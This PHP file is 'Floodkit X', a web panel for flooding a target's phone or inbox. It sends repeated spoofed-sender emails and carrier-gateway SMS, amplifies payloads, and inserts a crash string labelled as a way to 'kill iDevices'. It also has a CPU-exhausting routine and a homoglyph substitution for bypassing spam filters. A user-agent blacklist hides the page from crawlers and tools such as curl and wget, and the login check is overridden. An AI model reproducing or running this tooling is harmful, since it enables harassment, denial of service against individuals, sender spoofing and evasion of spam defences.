<?PHP
##################################
## Floodkit X	
##############
############
## Version 1.1.0
## License: The Unlicense	
##############
session_start();
$version = "1.1.0";
$password = "changeme"; //MD5 Hash

header('Content-Type: text/html; charset=utf-8');
$carriers = array("verizon", "tmobile", "sprint", "cingular", "att", "boostmobile", "virgin", "uscellular", "cricket", "metropcs");
$appleeffective = "effective. Power لُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ 冗";
$original 	= array('A', 'd', 'E', 'I', 'O', 'Y', 'a', 'e', 'o', 'y', '0');
$tampered	= array('А', 'd', 'Е', 'І', 'О', 'Ү', 'а', 'е', 'о', 'у', 'O');
$phpself 	= str_replace($original, $tampered, $_SERVER['PHP_SELF']);
$blacklist	= array("bot", "yahoo", "wget", "msn", "java", "baidu", "curl", "crawl", "survey", "teoma", "thumbnail", "tineye", "yandex", "yeti");
foreach ($blacklist as $badua) {
	if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), $badua)) { header("Location: {$phpself}"); }
}

if (isset($_REQUEST['password'])) {
	if (md5($_REQUEST['password']) == $password) { $_SESSION['loggedin'] = "AircJWfsf5ewgdsdgG5ggEg"; }
}
if (isset($_SESSION['loggedin'])) {
	if ($_SESSION['loggedin'] == "AircJWfsf5ewgdsdgG5ggEg") { $loggedin = true; } else { $loggedin = false; }
} else {
	$loggedin = false;
}

function getCarrier() {
	$npa = $to[0].$to[1].$to[2];
	$nxx = $to[3].$to[4].$to[5];
	$tho = $to[6].$to[7].$to[8].$to[9];
	$apires = file_get_contents("http://www.fonefinder.net/findome.php?npa=".$npa."&nxx=".$nxx."&thoublock=".$tho);
	$carriers = array("verizon", "tmobile", "sprint", "cingular", "att", "boostmobile", "virgin", "uscellular", "cricket", "metropcs");
	foreach ($carriers as $carriersearch) {
		if (strpos(strtolower($apires), $carriersearch)) { $carrier = $carriersearch; break; }
	}
	if ($response == "Could not detect the carrier") {
		$apires = file_get_contents("http://www.whitepages.com/phone/1-".$npa."-".$nxx."-".$tho);
		$carriers = array("verizon", "t-mobile", "sprint", "cingular", "at&t", "boostmobile", "virgin", "uscellular", "cricket", "metropcs");
		foreach ($carriers as $carriersearch) {
			if (strpos(strtolower($apires), $carriersearch)) { $carrier = $carriersearch; break; }
		}
	}
	return $carrier;
}

function amplifyMessage($message, $amp) {
	$payload = '';
	while (strlen($message) % 140 !== 0) { $message .= "~"; }
	for ($i = 0; $i <= $amp; $i++){ $payload .= $message; }
	return $payload;
}

function editValue($val) {
	$output = $val;
	if (strpos($output, "appleeffective") !== false) {
		$output = str_replace("appleeffective", $appleeffective, $output);
	}
	if (strpos($output, "rand") !== false) {
		$output = str_replace("rand", rand(10000, 99999).rand(10000, 99999), $output);
	}
	return $output;
}

function sendMessage($to, $victim, $email_orig, $subject_orig, $message_orig, $num) {
	for($i = 0; $i < $num; $i++) {
		if (isset($_REQUEST['delay'])) { sleep($_REQUEST['delay']); }
		$email = editValue($email_orig);
		$subject = editValue($subject_orig);
		$message = editValue($message_orig);

        // Get the site domain and get rid of www.
        $sitename = strtolower( $_SERVER['SERVER_NAME'] );
        if ( substr( $sitename, 0, 4 ) == 'www.' ) {
                $sitename = substr( $sitename, 4 );
        }

        $email = $email . '@' . $sitename;

		if (isset($_REQUEST['mass'])) {
			mail($to[$i], $subject, $message, "From: {$email} <{$email}>\r\nReply-To: {$email}\r\nPriority: normal\r\nContent-type: text/html; charset=UTF-8;");
		} else {
			mail($victim, $subject, $message, "From: {$email} <{$email}>\r\nReply-To: {$email}\r\nPriority: normal\r\nContent-type: text/html; charset=UTF-8;");
		}
	}
	return $i;
}



$loggedin = true;
if ($loggedin == true) {
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('memory_limit','9999999999M');
?>
<html>
	<head>
		<title>
			Floodkit X <?PHP print $version; ?>
		</title>
		<style>
		* {
		margin: 0px;
		font-weight: 450;
		}
		body {
		background: #000;
		color: #FFF;
		font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
		text-align: center;
		font-size: 16px;
		}
		.topthing {
		font-family: Copperplate, "Copperplate Gothic Light", fantasy;
		width: 20%;
		text-align: center;
		font-size: 16px;
		cursor: default;
		margin-left: auto;
		margin-right: auto;
		margin-bottom: 25px;
		display: inline-block;
		}
		.navthing {
		border-top: none;
		padding: 1% .5%;
		transition: 1s;
		color: #FFF;
		display: inline-block;
		}
		.navthing:hover {
		background: #111;
		color: orange;
		}
		#topnavthing:hover {
		color: #FFF;
		}
		.topthing a {
		text-decoration: none;
		}
		.cont {
		width: 90%;
		min-width: 450px;
		background: #080808;
		padding: 10px;
		margin-bottom: 1%;
		display: inline-block;
		vertical-align: top;
		margin-top: 25px;
		border-top: 1px solid orange;
		border-bottom: 1px solid orange;
		}
		form, table {
		margin-left: auto;
		margin-right: auto;
		width: 100%;
		}
		input, textarea, select {
		background: #000;
		border-radius: 2px;
		border: 1px solid #666;
		width: 100%;
		padding: 4px;
		margin: 4px;
		max-width: 100%;
		font-weight: 600;
		transition: .10s;
		color: orange;
		}
		table td:first-child {
		width: 75px;
		}​
		input[type="submit"] {
		width: 150px;
		margin-top: 5px;
		color: #FFF;
		}
		input:focus, textarea:focus, select:focus {
		background: #111;
		}
		</style>
	</head>
	<body>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>"><div class="navthing" id="topnavthing"><b>Floodkit <span style="color: orange;">X</span> <?PHP print $version; ?></b></div></a><br>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>?action=cell"><div class="navthing">Cell</div></a>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>?action=email"><div class="navthing">Email</div></a>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>?action=mass"><div class="navthing">Massmail</div></a>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>?action=cpu"><div class="navthing">CPUmelter</div></a>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>?action=spambypass"><div class="navthing">Spamfilter Bypass</div></a>
		<a href="<?PHP print $_SERVER['PHP_SELF']; ?>?action=logout"><div class="navthing">Logout</div></a>
		<br>
		<div class="cont">
	<?php
##################################
## Print forms and take input	
##############
	if (isset($_GET['action'])) {
		print "<form method='post'>";
		if ($_GET['action'] == "cell") {
			print '
				Use the word "rand" (without quotes) to use random numbers. Use "appleeffective" to kill iDevices.<br>
				Amplify will work on recipients that have long text messages split into multiple, otherwise it will probably just decrease speed.
					<table>
						<tr><td>Target:</td><td><input type="text" name="target" placeholder="Target goes here." required /></td></tr>
						<tr><td>Carrier:</td><td>
						<select name="carrier" required />
							<option value="autodetect">autodetect</option>
							';
							foreach ($carriers as $car) {
								print '<option value="'.$car.'">'.$car.'</option>';
							}
							print '
						</select></td></tr>
						<tr><td>Fromline:</td><td><input type="text" name="from" placeholder="root@fbi.gov" required /></td></tr>
						<tr><td>Subject:</td><td><input type="text" name="subject" placeholder="Subject goes here." /></td></tr>
						<tr><td>Message:</td><td><textarea name="message" placeholder="Message goes here." required></textarea></td></tr>
						<tr><td>Count:</td><td><input type="text" name="count" placeholder="100" required /></td></tr>
						<tr><td>Amplify *:</td><td><input type="text" name="amplify" placeholder="100" required /></td></tr>
						<tr><td>Delay (s):</td><td><input type="text" name="delay" value="1" required /></td></tr>
					</table>
					<input type="submit" value="Flood!" />
			';
		} else if ($_GET['action'] == "email") {
			print '
				Type "rand" (without quotes) to use random numbers. Use "appleeffective" to kill iDevices.
					<table>
						<tr><td>Target:</td><td><input type="text" name="target" placeholder="Target goes here." required /></td></tr>
						<tr><td>Fromline:</td><td><input type="text" name="from" placeholder="root@fbi.gov" required /></td></tr>
						<tr><td>Subject:</td><td><input type="text" name="subject" placeholder="Subject goes here." /></td></tr>
						<tr><td>Message:</td><td><textarea name="message" placeholder="Message goes here." required></textarea></td></tr>
						<tr><td>Count:</td><td><input type="text" name="count" placeholder="100" required /></td></tr>
						<tr><td>Delay (s):</td><td><input type="text" name="delay" value="1" required /></td></tr>
					</table>
					<input type="submit" value="Flood!" />
			';
		} else if ($_GET['action'] == "mass") {
			print '
				Type "rand" (without quotes) to use random numbers.  Use "appleeffective" to kill iDevices.
					<table>
						<tr><td>Targets:</td><td><textarea name="target" placeholder="Targets go here." required></textarea></td></tr>
						<tr><td>Fromline:</td><td><input type="text" name="from" placeholder="root@fbi.gov" required></textarea></td></tr>
						<tr><td>Subject:</td><td><input type="text" name="subject" placeholder="Subject goes here." /></td></tr>
						<tr><td>Message:</td><td><textarea name="message" placeholder="Message goes here." required></textarea></td></tr>
						<tr><td>Delay (s):</td><td><input type="text" name="delay" value="1" required /></td></tr>
					</table>
					<input type="hidden" name="count" value="mass" required />
					<input type="submit" name="mass" value="Flood!" />
			';
		} else if ($_GET['action'] == "cpu") {
			print '
					<table>
						<tr><td>Time (s):</td><td><input type="text" name="time" placeholder="3600"</td></tr>
					</table>
					<input type="submit" value="Eat CPU" name="cpu" />
			';
		} else if ($_GET['action'] == "logout") {
			unset($_SESSION['loggedin']);
			header("Location: ".$_SERVER['PHP_SELF']);
		} else if ($_GET['action'] == "spambypass") {
			print '
				Notice!!! Links will be converted too. This tool is recommended to be used BEFORE adding anchor tags. You will need to use this for the subject if it sounds spammy also.
					<table>
						<tr><td>Text:</td><td><textarea name="message" placeholder="Message to modify here."></textarea></td></tr>
					</table>
					<input type="submit" value="Get output" name="antispam" />
					';
		} else {
			print 'Illegal.';
		}
		print "</form>";
	} else {
		print 'Welcome to Floodkit X '.$version.'<br><br>Drop emails, not bombs <span style="font-size: 300%;">✌</span>';
	}
##################################
## Process input	
##############
	if (isset($_REQUEST['target'])) {
		
		$to = $_REQUEST['target'];
		
		if (isset($_REQUEST['carrier'])) {

			$carrier = $_REQUEST['carrier'];
			$strip = array("/", "(", ")", " ", "-", "_", "*", "#");
			$to = str_replace($strip, "", $to);

			if ($carrier == "autodetect") { $carrier = getCarrier(); }

			if 	($carrier == "verizon")									{ $carrier = "@vtext.com"; }
			else if	($carrier == "tmobile" || $carrier == "t-mobile") 	{ $carrier = "@tmomail.net"; }
			else if	($carrier == "sprint")								{ $carrier = "@messaging.sprintpcs.com"; }
			else if	($carrier == "cingular")							{ $carrier = "@cingularme.com"; }
			else if	($carrier == "att" || $carrier == "at&t")			{ $carrier = "@txt.att.net"; }
			else if	($carrier == "boostmobile")							{ $carrier = "@myboostmobile.com"; }
			else if	($carrier == "virgin")								{ $carrier = "@vmobl.com"; }
			else if	($carrier == "uscellular")							{ $carrier = "@email.uscc.net"; }
			else if	($carrier == "cricket")								{ $carrier = "@sms.mycricket.com"; }
			else if	($carrier == "metropcs")							{ $carrier = "@mymetropcs.com"; }
			else { $result = "Carrier invalid."; }
			$victim = $to . $carrier;
		} else {
			$victim = $to;
		}
		
		if (isset($_REQUEST['mass'])) {
			$to = preg_split('/\r\n|[\r\n]/', $to);
		}
		
		if (isset($_REQUEST['from'])) { $email = $_REQUEST['from']; } else { $response = "A from header must be specified in your request."; }

		if (isset($_REQUEST['subject'])) { $subject = $_REQUEST['subject']; } else { $subject = ""; }

		if (isset($_REQUEST['message'])) {
			$message = $_REQUEST['message'];
			if (isset($_REQUEST['amplify'])) {
				$message = amplifyMessage($message, $_REQUEST['amplify']);
			}
		} else { $response = "A message must be specified in your request."; }

		if (isset($_REQUEST['count'])) {
			if ($_REQUEST['count'] == "mass") { $num = count($to); } else { $num = $_REQUEST['count']; }
		} else { $response = "A number of messages must be specified in your request."; }
		
		if (!isset($response)) {
			if ($num == "rand") { $num = rand(10, 1000); }
			$email_orig = $email; $subject_orig = $subject; $message_orig = $message;

			$message_num = sendMessage($to, $victim, $email, $subject, $message, $num);

			if (isset($_REQUEST['mass'])) { print $i.' messages sent.'; } else { print 'Your message was sent to '.$victim.' '.$message_num.' times.'; }
		} else {
			print $response;
		}
	} else if (isset($_REQUEST['cpu'])) {
		$exectime = $_REQUEST['time']+time();
		while (time() < $exectime) {
			$set = mt_rand(10000, 99999);
			$$set = $set;
		}
	} else if (isset($_REQUEST['antispam'])) {
		$nospam = str_replace($original, $tampered, $_REQUEST['message']);
		print '
			<table>
				<tr><td>Out: </td><td><textarea readonly>'.$nospam.'</textarea></td></tr>
			</table>
				';
	}
	
	?>
			</div><br>
		</body>
	</html>
<?PHP
} else {
	print '
	<html>
		<head>
			<title>
				'.print mt_rand(1, 9001).'
			</title>
			<style>
			* {
			margin: 0px;
			}
			body, input, form {
			font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
			background: #000;
			color: #FFF;
			}
			form {
			text-align: center;
			margin-left: auto;
			margin-right: auto;
			padding-top: 15%;
			}
			input {
			background: #000;
			border-radius: 2px;
			border: 1px solid #666;
			width: 250px;
			padding: 4px;
			margin: 4px;
			font-weight: 600;
			transition: .10s;
			color: orange;
			}
			input[type="submit"] {
			width: 150px;
			margin-top: 5px;
			color: #FFF;
			}
			input:focus {
			background: #111;
			}
			</style>
		</head>
		<body>
			<form method="POST">
				Login:<br>
				<input type="password" name="password" />
				<input type="submit" style="position: absolute; top: -9001;" />
			</form>
		</body>
	</html>
	<?php
	';
}
?>
